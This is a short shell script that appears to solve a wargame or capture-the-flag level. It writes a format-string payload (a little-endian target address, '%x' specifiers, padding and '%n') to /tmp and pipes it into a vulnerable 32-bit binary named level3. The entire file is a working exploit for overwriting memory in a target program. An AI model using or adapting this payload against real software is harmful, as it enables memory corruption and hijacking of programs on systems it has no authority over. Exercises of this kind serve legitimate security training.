#!/bin/sh

# REQUIREMENTS:
# Python must be installed
# Must be on a x86, 32bit Linux architecture.

ADDRESS_LITTLE_ENDIAN="\x8c\x98\x04\x08"

# Default multiplier
MULTIPLIER=38

# Check if an argument is provided
if [ ! -z "$1" ]; then
  MULTIPLIER=$1
fi

# Create the payload
echo $(python -c "print('\x8c\x98\x04\x08' + '%x ' * 3 + 'A' * $MULTIPLIER + '%n')") > /tmp/payload

# Run the vulnerable program
cat /tmp/payload - | /home/user/level3/level3

# Remove the temporary payload file
rm /tmp/payload